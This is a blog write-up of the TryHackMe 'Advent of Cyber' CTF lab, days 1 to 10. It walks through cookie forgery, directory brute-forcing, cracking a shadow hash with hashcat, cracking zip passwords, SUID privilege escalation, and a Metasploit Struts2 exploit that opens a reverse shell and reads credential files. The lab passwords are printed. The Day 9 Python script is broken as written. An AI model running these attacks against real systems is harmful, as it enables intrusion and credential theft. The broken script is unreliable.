---
title: Writeup for TryHackMe room - Advent of Cyber
author: 4n3i5v74
date: 2021-02-05 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, network, protocols, web, database, binary, privesc, osint, cloud, encryption]
pin: true
---

## [Advent of Cyber](https://tryhackme.com/room/25daysofchristmas){:target="_blank"}

This room contains info and methods to recon and enumerate network captures, protocols, web servers, databases, binaries and SUID, privilege escalations, osint, cloud and encryption.


## Task 6 - Day 1 - Inventory Managemement

This task is about cookie manipulation using hex codes.


Use these links as references.
- [TryHackMe supporting material](https://docs.google.com/document/d/1PHs7uRS1whLY9tgxH1lj-bnEVWtXPXpo45zWUlbknpU/edit?usp=sharing){:target="_blank"}
- [Curl POST authentication](https://reqbin.com/req/c-2cd3jxee/curl-post-with-basic-authentication){:target="_blank"}


Use `firefox` to login `http://<ip>:3000` to get and simulate cookies for login to bypass auth.
{% capture code %}{% raw %}redirect to /login
inspect page
register and login{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

Before login, there will not be a cookie set. After registering and login, inspect for cookies in `firefox`.
{% capture code %}{% raw %}inspect page (cookie - authid)
cookie value - decode (from base64 - <cookie - auth with username appended>)
encode (to base64 - mcinventory<append auth cookie piece> - <hash>)

Get cookie value and append to user to generate `mcinventory` user cookie and to get item the user requested for.
{% capture code %}{% raw %}cookie value - replace with mcinventory's cookie value
reload page
mcinventory's inventory list (requested item - <item>){% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}


## Task 7 - Day 2 - Arctic Forum

This task is about using `dirsearch` to brute-force hidden directories in web site and logging in using default credentials.


Use these links as references.
- [Dirbuster Reference](https://sourceforge.net/projects/dirbuster/){:target="_blank"}
- [Dirsearch Reference](https://github.com/maurosoria/dirsearch){:target="_blank"}
- [Dirsearch Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-dirsearch){:target="_blank"}
- [Arctic Digital Design Reference](https://github.com/ashu-savani/arctic-digital-design){:target="_blank"}


Use `dirsearch` to get available directories, their redirection, response code and size for web site.
{% capture code %}{% raw %}./dirsearch.py -u http://<ip>:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

An output similar to below will be obtained.
{% capture code %}{% raw %} _|. _ _  _  _  _ _|_    v0.4.1
(_||| _) (/_(_|| (_| )

Extensions: html | HTTP method: GET | Threads: 30 | Wordlist size: 220520

Error Log: /opt/dirsearch/logs/errors-21-01-15_14-56-10.log

Target: http://<ip>:3000/

Output File: /opt/dirsearch/reports/<ip>/_21-01-15_14-56-10.txt

[14:56:11] Starting:
[14:56:11] 302 -   28B  - /home  ->  /login
[14:56:11] 200 -    2KB - /login
[14:56:11] 302 -   27B  - /admin  ->  /home
[14:56:11] 301 -  179B  - /assets  ->  /assets/
[14:56:11] 302 -   28B  - /Home  ->  /login
[14:56:12] 301 -  173B  - /css  ->  /css/
[14:56:12] 200 -    2KB - /Login
[14:56:12] 301 -  171B  - /js  ->  /js/
[14:56:13] 302 -   28B  - /logout  ->  /login
[14:56:17] 200 -    2KB - /<hidden-page>
[14:56:21] 302 -   27B  - /Admin  ->  /home
[14:56:31] 302 -   28B  - /HOME  ->  /login
[14:56:36] 302 -   28B  - /Logout  ->  /login
[15:00:22] 200 -    2KB - /<hidden-page>
[15:00:51] 200 -    2KB - /LogIn
[15:05:36] 200 -    2KB - /LOGIN

Task Completed{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

Once the hidden page is found, inspect its source using `firefox` or `curl`.
{% capture code %}{% raw %}curl <ip>:3000/<hidden-page>{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}<!DOCTYPE html>
<html>
    <head>
    <title>Arctic Forum | Admin Login</title>
    <link rel="stylesheet" href="../css/bootstrap.min.css">
    <script src="../js/bootstrap.min.js"></script>
</head>
    <style>
a {
    color: white;
}
</style>
<div class="container">
    <nav class="navbar navbar-expand-lg" style="background-color: #656565; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px;">
    <a class="navbar-brand" href="#">
    <img style='height: 50px' src="assets/pole.png">
    Arctic Forum
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
    <ul class="navbar-nav">
        <li class="nav-item">
        <a class="nav-link" href="/login">Login</a>
        </li>
    </ul>
    </div>
</div>
</nav>
    </br>
    <div class="container">
    <h1> Admin Login </h1>
        <form method="post" action="/<hidden-page>">
            <div class="form-group">
                <label for="item">Email</label>
                <input type="text" class="form-control" id="username" name="username">
            </div>
            <div class="form-group">
                <label for="item">Password</label>
                <input type="password" class="form-control" id="password" name="password">
            </div>
            <button type="submit" class="btn btn-default">Submit</button>
        </form>
    </div>
    <!--
    Admin portal created by arctic digital design - check out our github repo
    -->
</html>{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

From the page source, check github repo for [Arctic Digital Design](https://github.com/ashu-savani/arctic-digital-design){:target="_blank"}. There will be a default credential available. Try that in `firefox` to see if login is working and get the flag.


## Task 8 - Day 3 - Evil Elf

This task is about using `wireshark` to analyse `telnet` packets and decrypting password hash using `hashcat` to get login credentials.


Use these links as references.
- [TryHackMe supporting material](https://docs.google.com/document/d/1ZVsOtW7mM-4neZZ4QtYCEp__exiMrvlUCXTxhB-zyxk/edit){:target="_blank"}
- [Hashcat Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-hashcat){:target="_blank"}


Using `wireshark` to analyse the packet trace.
{% capture code %}{% raw %}Statistics
  - Protocol Hierarchy

Telnet
  - Apply as filter
      - Selected{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

Check the filtered data, under packet number `2255`. Since the telnet communication is un-encrypted, the application data can be captured as plain-text by `wireshark`.

The packet number `2906` shows someone executed command `cat /etc/shadow` over telnet, and its reply packet should contain the file contents. The password hash for user `buddy` can be found in packet `2908`.

Use `hashcat` crack the hash obtained from `wireshark`.
{% capture code %}{% raw %}hashcat -m 1800 '<hash>' /usr/share/wordlists/rockyou.txt{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}hashcat (v6.1.1-66-g6a419d06) starting...

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 5 secs

<hash>:<password>

Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: <hash>
Time.Started.....: Sat Jan 16 14:42:17 2021 (0 secs)
Time.Estimated...: Sat Jan 16 14:42:17 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      606 H/s (10.41ms) @ Accel:64 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 256/14344384 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 128/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
Candidates.#1....: carolina -> freedom

Started: Sat Jan 16 14:41:39 2021
Stopped: Sat Jan 16 14:42:18 2021{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}


## Task 9 - Day 4 - Training

This task is about linux command line utilities.


Use these links as references.
- [TryHackMe supporting material](https://docs.google.com/document/d/1CpwM_MdHgRqlPSe4eCC_-rVgi8F1xh88PKOySTRSkxU/edit){:target="_blank"}


Use `ssh` to login to the machine using password `bestelf1234`.
{% capture code %}{% raw %}ssh mcsysadmin@<ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

All the info can be found as below.
{% capture code %}{% raw %}[mcsysadmin@ip-10-10-26-239 ~]$ ls
<list of files>

[mcsysadmin@ip-10-10-26-239 ~]$ cat file5
<content>

[mcsysadmin@ip-10-10-26-239 ~]$ grep -irn password .
./<file>:46:passwordHpKRQfdxzZocwg5O0RsiyLSVQon72CjFmsV4ZLGjxI8tXYo1NhLsEply

[mcsysadmin@ip-10-10-26-239 ~]$ grep -r -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" .
./file2:<ip>

[mcsysadmin@ip-10-10-26-239 ~]$ ls /home
<users>

[mcsysadmin@ip-10-10-26-239 ~]$ sha1sum file8
<sha1sum>  file8

[mcsysadmin@ip-10-10-26-239 ~]$ find / 2>/dev/null | grep "shadow.bak"
/var/shadow.bak

[mcsysadmin@ip-10-10-26-239 ~]$ grep mcsysadmin /var/shadow.bak
mcsysadmin:<hash>:18234:0:99999:7:::{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}


## Task 10 - Day 5 - Ho-Ho-Hosint

This task is about using `exiftool` to get information about image and using `osint` to gather information from social websites.


Use these links as references.
- [TryHackMe supporting material](https://blog.tryhackme.com/ho-ho/){:target="_blank"}
- [OSINT Framework](https://osintframework.com/){:target="_blank"}
- [Web Archive](https://web.archive.org/){:target="_blank"}
- [Google image search](https://www.google.com/imghp?hl=en){:target="_blank"}


Use `exiftool` to check if there is any hidden information from the downloaded image.
{% capture code %}{% raw %}exiftool thegrinch.jpg{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}ExifTool Version Number         : 10.80
File Name                       : thegrinch.jpg
Directory                       : .
File Size                       : 69 kB
File Modification Date/Time     : 2021:01:16 18:19:32+00:00
File Access Date/Time           : 2021:01:16 18:19:32+00:00
File Inode Change Date/Time     : 2021:01:16 18:19:36+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 10.10
Creator                         : <user>
Image Width                     : 642
Image Height                    : 429
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 642x429
Megapixels                      : 0.275{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

Use `firefox` to search about `user`. A `twitter` and `wordpress` page will appear in result.

The following information will be available from `twitter` user profile page.
{% capture code %}{% raw %}Born <birthday>
I am one of <profession>, but am a professional photographer after December!
Us Elves can now make iPhone's! Who'da thought it!
  ~ Sent from <iphone-model>{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

There will be an image in the `wordpress` site. Searching about it on `google image search` will provide more information.

Upon searching for `wordpress` site on `wayback machine`, the very first archive gives information about `profession` start date.


## Task 11 - Day 6 - Data Elf-iltration

This task is about using `wireshark` to gather `dns` and `http` data and get the contents hidden in dns requests and http objects, and using `fcrackzip` to brute-force password for compressed file.


Use these links as references.
- [TryHackMe supporting material](https://docs.google.com/document/d/17vU134ZfKiiE-DgiynrO0MySo4_VCGCpw2YJV_Kp3Pk/edit?usp=sharing){:target="_blank"}

Using `wireshark` to analyse the packet trace.
{% capture code %}{% raw %}Statistics
  - Protocol Hierarchy

DNS
  - Apply as filter
      - Selected{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

Check the filtered data, under packet number `9`. The hex encoded query can be decoded using `cyberchef`.
{% capture code %}{% raw %}Input
    <query-hash>
From hex
    <stolen-info>{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

The same information can also be obtained from `xxd`.
{% capture code %}{% raw %}echo '<query-hash>' | xxd -r -p{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

Use `wireshark` to export objects and analyse it.
{% capture code %}{% raw %}File
    - Export Objects
        - HTTP
            - Save all{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

There is a `zip` file which seems to be encrypted. Use `fcrackzip` to try an unlock the password.
{% capture code %}{% raw %}fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v holidaythief/christmaslists.zip{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}found file 'christmaslistdan.tx', (size cp/uc     91/    79, flags 9, chk 9a34)
found file 'christmaslistdark.txt', (size cp/uc     91/    82, flags 9, chk 9a4d)
found file 'christmaslistskidyandashu.txt', (size cp/uc    108/   116, flags 9, chk 9a74)
found file 'christmaslisttimmy.txt', (size cp/uc    105/   101, flags 9, chk 9a11)
possible pw found: december (){% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

Extract the file with cracked credential.
{% capture code %}{% raw %}cd holidaythief ; unzip christmaslists.zip{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Archive:  christmaslists.zip
[christmaslists.zip] christmaslistdan.tx password:
extracting: christmaslistdan.tx
inflating: christmaslistdark.txt
inflating: christmaslistskidyandashu.txt
inflating: christmaslisttimmy.txt{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

Open the text file one by one to find the <item>.

Check if there is any encoded content in `TryHackMe.jpg` file using `steghide` and empty passphrase.
{% capture code %}{% raw %}steghide extract -sf ./TryHackMe.jpg{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

An output similar to below will be obtained. The file content will have <id>.
{% capture code %}{% raw %}Enter passphrase:
wrote extracted data to "christmasmonster.txt".{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}


## Task 11 - Day 7 - Skilling up

This task is about using `nmap` to get hidden `http` web site port.


Use these links as references.
- [TryHackMe supporting material](https://docs.google.com/document/d/1q0FziVZM3zCWhcgtPpljVPzkBX0fMAh6ebrXVM5rg08/edit?usp=sharing){:target="_blank"}
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Using `nmap`, perform basic recon and get listening ports.
{% capture code %}{% raw %}nmap -Pn -T4 -sS --reason --open -p1-1000 -A <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-17 17:49 GMT
Nmap scan report for <hostname> (<ip>)
Host is up, received arp-response (0.00063s latency).
Not shown: 997 closed ports
Reason: 997 resets
PORT    STATE SERVICE REASON          VERSION
22/tcp  open  ssh     syn-ack ttl 255 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 bc:e4:28:72:ea:3a:ab:9a:15:8d:06:bb:07:8d:01:2f (RSA)
|   256 00:5d:66:91:3b:2b:8f:3e:01:94:f4:05:26:9b:a2:b0 (ECDSA)
|_  256 05:bf:a3:3d:55:54:4a:09:03:a9:20:0d:15:af:68:2d (EdDSA)
111/tcp open  rpcbind syn-ack ttl 255 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38801/udp  status
|_  100024  1          42385/tcp  status
999/tcp open  http    syn-ack ttl 255 SimpleHTTPServer 0.6 (Python 3.6.8)
|_http-server-header: SimpleHTTP/0.6 Python/3.6.8
MAC Address: 02:39:76:0B:24:D9 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/17%OT=22%CT=1%CU=34454%PV=Y%DS=1%DC=D%G=Y%M=023976%T
OS:M=600478DF%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=FF%W=
OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=FF%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)

Network Distance: 1 hop
TRACEROUTE
HOP RTT     ADDRESS
1   0.63 ms <hostname> (<ip>)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.20 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}

Using `firefox` to open the http site on port `999`, we can see a <file> accessible.


## Task 12 - Day 8 - SUID Shenanigans

This task is about using `nmap` to get hidden `ssh` port and using `SUID` to get user and root file contents.


Use these links as references.
- [Privilege Escalation Reference](https://blog.tryhackme.com/linux-privilege-escalation-suid/){:target="_blank"}
- [Privilege Escalation Reference](https://payatu.com/guide-linux-privilege-escalation){:target="_blank"}
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Using `nmap`, perform basic recon and get listening ports.
{% capture code %}{% raw %}nmap -Pn -T4 -sS --reason --open -p- -A <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-17 18:08 GMT
Nmap scan report for <hostname> (<ip>)
Host is up, received arp-response (0.00041s latency).
Not shown: 65534 closed ports
Reason: 65534 resets
PORT      STATE SERVICE REASON         VERSION
<port>/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c1:f9:56:22:a7:60:00:37:62:7f:02:e3:af:b2:7f:7a (RSA)
|   256 8a:5a:04:b8:74:1f:88:67:a9:6f:49:44:76:1f:1e:09 (ECDSA)
|_  256 21:3d:f6:96:2b:0c:8c:d7:63:02:1f:01:6c:fa:d5:1f (EdDSA)
MAC Address: 02:FD:D1:3B:0C:E3 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/17%OT=65534%CT=1%CU=41424%PV=Y%DS=1%DC=D%G=Y%M=02FDD
OS:1%TM=60047D4D%P=x86_64-pc-linux-gnu)SEQ(SP=F7%GCD=1%ISR=10C%TI=Z%CI=I%TS
OS:=8)SEQ(SP=F7%GCD=1%ISR=10C%TI=Z%CI=RD%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M
OS:2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST1
OS:1)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%
OS:W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms <hostname> (<ip>)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.13 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `ssh` to login to machine as user `holly` and password `tuD@4vt0G*TU`. But the ssh service is not running on default port and could be got from `nmap` scan.
{% capture code %}{% raw %}ssh holly@<ip> -p 65534{% endraw %}{% endcapture %} {% include code.html code=code%}

If looked at location `/usr/bin` there would be a binary with `SUID` tag set with ownership of user `igor`. An output similar to below will be obtained. Use the <binary> to get the flag.
{% capture code %}{% raw %}holly@<hostname>:~$ ll <binary>
-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 <binary>
holly@<hostname>:~$ find /home/igor -name flag1.txt -exec cat {} \;
    <flag>{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `find` to find executables which has `SUID` set as root user.
{% capture code %}{% raw %}find / -user root -perm -4000 2>/dev/null{% endraw %}{% endcapture %} {% include code.html code=code%}

There is a binary set with `SUID` for root. Trying to execute will allow users to run any command as root, and using the same the `flag` can be retrieved.


## Task 14 - Day 9 - Requests

This task is about getting `web` page contents programatically and stitching together the message from each web page.


Use these links as references.
- [TryHackMe supporting material](https://docs.google.com/document/d/1FyAnxlQpzh0Cy17cKLsUZYCYqUA3eHu2hm0snilaPL0/edit?usp=sharing){:target="_blank"}


When accessing the url `http://10.10.169.100:3000`, there is a response `{"value":"s","next":"f"}`. Accessing page with next value `http://10.10.169.100:3000/f` will give another string.

This can be done manually or programatically. An example script would be like below. Executing the script will give the <flag>.
{% capture code %}{% raw %}import requests

init_response = requests.get( 'http://10.10.169.100:3000' )

message = init_response.json()['value']
nxt = init_response.json()['next']

while True:
    response = requests.get( "http://10.10.169.100:3000/" + nxt )
    if response.json()['value'] = 'end':
        break

message += response.json()['value']
nxt = response.json()['next']

print(message){% endraw %}{% endcapture %} {% include code.html code=code%}


## Task 15 - Day 10 - Metasploit-a-ho-ho-ho

This task is about using `nmap` to get web service information and using `metasploit` to exploit `apache struts 2` vulnerability.


Use these links as references.
- [TryHackMe supporting material](https://blog.tryhackme.com/metasploit/){:target="_blank"}
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Using `nmap`, perform basic recon and get listening ports.
{% capture code %}{% raw %}nmap -Pn -T4 -sS -F --reason --open <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-23 12:58 GMT
Nmap scan report for <hostname> (<ip>)
Host is up, received arp-response (0.0011s latency).
Not shown: 97 closed ports
Reason: 97 resets
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 255
80/tcp  open  http    syn-ack ttl 254
111/tcp open  rpcbind syn-ack ttl 255
MAC Address: 02:EA:AF:A4:E6:7D (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `nmap` service scan on port `80` to find version of web server.
{% capture code %}{% raw %}nmap -Pn -p80 -sV <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-23 12:59 GMT
Nmap scan report for <hostname> (<ip>)
Host is up (0.00020s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 02:EA:AF:A4:E6:7D (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `firefox` to check the url `http://<ip>`, and the resource `showcase.action` is available. This can be used to exploit `apache struts 2` using the [CVE-2017-5638](https://www.exploit-db.com/exploits/41570){:target="_blank"}.

Use `msfconsole` to exploit `apache struts 2` web application.
{% capture code %}{% raw %}msf5 > search struts2

Matching Modules

#  Name                                             Disclosure Date  Rank       Check  Description
-  ----                                             ---------------  ----       -----  -----------
0  exploit/multi/http/struts2_code_exec_showcase    2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL CodeExecution
1  exploit/multi/http/struts2_content_type_ognl     2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
3  exploit/multi/http/struts2_rest_xstream          2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
4  exploit/multi/http/struts_code_exec_classloader  2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote CodeExecution
5  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote CodeExecution
6  exploit/multi/http/struts_dev_mode               2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution

msf5 > use exploit/multi/http/struts2_content_type_ognl
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

Name       Current Setting     Required  Description
----       ---------------     --------  -----------
Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT      8080                yes       The target port (TCP)
SSL        false               no        Negotiate SSL/TLS for outgoing connections
TARGETURI  /struts2-showcase/  yes       The path to a struts application action
VHOST                          no        HTTP server virtual host

Payload options (linux/x64/meterpreter/reverse_tcp):

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST  <local-ip>     yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Exploit target:

Id  Name
--  ----
0   Universal

msf5 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS <ip>
RHOSTS => <ip>
msf5 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
TARGETURI => /showcase.action
msf5 exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
RPORT => 80{% endraw %}{% endcapture %} {% include code.html code=code%}

Exploiting with the set options will gain a `shell`, where `flag` can be retrieved.
{% capture code %}{% raw %}msf5 exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on <local-ip>:4444
[*] Sending stage (3012516 bytes) to <ip>
[*] Meterpreter session 1 opened (<local-ip>:4444 -> <ip>:57606) at 2021-01-23 13:39:13 +0000

meterpreter > shell
Process 58 created.
Channel 1 created.
script -qc /bin/bash /dev/null

root@<hostname>:/usr/local/tomcat# find / -type f -iname *flag.txt*
find / -type f -iname *flag*
<flag-file>

root@<hostname>:/usr/local/tomcat# cat <flag-file>
cat <flag-file>
    <flag>{% endraw %}{% endcapture %} {% include code.html code=code%}

There is a file with `ssh` creds in santa's home folder. The same can be retrieved from msf shell.
{% capture code %}{% raw %}root@<hostname>:/# cat /home/santa/<creds-file>
cat /home/santa/<creds-file>
    santa:<password>{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `ssh` to machine as `santa` user with `password` retrieved from `msfconsole` shell, to retrieve `file-contents`.
{% capture code %}{% raw %}[santa@<hostname> ~]$ ls
naughty_list.txt  nice_list.txt

[santa@<hostname> ~]$ sed '148q;d' naughty_list.txt
<user>

[santa@<hostname> ~]$ sed '52q;d' nice_list.txt
<user>{% endraw %}{% endcapture %} {% include code.html code=code%}

